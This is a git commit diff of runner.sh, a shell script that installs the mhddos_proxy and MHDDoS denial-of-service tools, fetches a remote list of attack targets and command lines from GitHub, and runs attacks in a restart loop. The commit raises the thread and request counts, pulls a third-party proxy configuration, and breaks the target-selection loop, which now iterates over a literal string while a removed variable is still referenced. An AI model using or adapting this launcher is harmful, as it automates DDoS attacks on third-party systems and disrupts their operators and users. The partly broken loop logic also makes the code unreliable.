ca6d590115f2aaf0228f526a782207cb93dc24ce
alexnest-ua <74729549+alexnest-ua@users.noreply.github.com>
2022-03-18 23:25:08 +0200

    Update runner.sh

--- runner.sh
+++ runner.sh
@@ -6,53 +6,44 @@
 
 ##### To kill script just close terminal window. OR. In other terminal run 'pkill -f python3'. And press CTRL+C in main window.
 
-## "num_of_copies" allows to start several copies of runner.py.
-## Each copy will choose different target from https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets
-## This is different from "multiple targets" in mhddos_proxy. Built in mhddos_proxy "multiple targets" can attack multiple IP's but only with same one method.
-## "num_of_copies" allows to launch several copies of runner.py and targets will be attacked with different methods.
-## Default = 2 copies(instances). Don't use high values without testing first, pc/vps can slowdown.
-num_of_copies="${1:-2}"
+
 
 ## Restart script every N seconds (900s = 15m, 1800s = 30m, 3600s = 60m).
 ## It allows to download updates for mhddos_proxy, MHDDoS and target list.
-## By default 900s (15m), can be passed as second parameter
-restart_interval="${2:-900}"
+## By default 600s (10m), can be passed as second parameter
+restart_interval="10m"
 
 
 #parameters that passed to python scrypt
-threads="${3:-500}"
-threads="-t $threads"
-rpc="${4:-50}"
-rpc="--rpc $rpc"
-proxy_interval=3600
-proxy_interval="-p $proxy_interval"
+threads="-t 1000"
+rpc="--rpc 200"
+proxy_interval="-p 600"
 
 #Just in case kill previous copy of mhddos_proxy
-pkill -f start.py
-pkill python3
+pkill -f ./start.py
+pkill -f runner.py
 
 # Install git, python3, pip if doesn't installed already
-if [ ! -f /usr/bin/git ]; then
-   sudo apt install git -y
-fi
-if [ ! -f /usr/bin/python3 ]; then
-   sudo apt install python3 -y
-fi
-if [ ! -f /usr/bin/pip ]; then
-   apt install python3-pip  -y
-fi
-pip install --upgrade pip > /dev/null #No output. Resolved some problems with pip on debian
+sudo apt install git -y
+sudo apt upgrade git -y
+sudo apt install python3 -y
+sudo apt upgrade python3 -y
+sudo apt install python3-pip -y
+sudo apt upgrade python3-pip -y
+
 
 
 #Install latest version of mhddos_proxy and MHDDoS
 cd ~
-rm -rf mhddos_proxy
+sudo rm -r mhddos_proxy
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 cd mhddos_proxy
-git clone https://github.com/MHProDev/MHDDoS.git
-python3 -m pip install -r MHDDoS/requirements.txt
+sudo rm proxies_config.json
+sudo wget https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json
+sudo git clone https://github.com/MHProDev/MHDDoS.git
+sudo python3 -m pip install -r MHDDoS/requirements.txt
 
-# Restart attacks and update targets list every 15 minutes (by default)
+# Restart attacks and update targets list every 10 minutes (by default)
 while true
 echo -e "#####################################\n"
 do
@@ -61,13 +52,8 @@ do
    
    echo -e "\nNumber of targets in list: " $list_size "\n"
 
-   # Create list with random numbers. To choose random targets from list on next step.
-   random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
-   echo -e "random number(s): " $random_numbers "\n"
    
-   # Print all randomly selected targets on screen
-   echo -e "Choosen target(s):\n"
-   for i in $random_numbers
+   for i in list_size
    do
              target=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "^runner.py")")
              echo -e "    "$target"\n"
@@ -77,7 +63,7 @@ do
    for i in $random_numbers
    do
             # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
-            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets | cat | grep "^runner.py")")
+            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/auto_mhddos/main/runner_targets | cat | grep "^runner.py")")
            
             echo "command line"
             echo $cmd_line
@@ -89,6 +75,6 @@ do
 echo -e "#####################################\n"
 sleep $restart_interval
 echo -e "RESTARTING\n"
-pkill -f start.py #In theory should work but doesn't give good results
-pkill python3 #It just works (c)
+pkill -f ./start.py
+pkill -f runner.py
 done
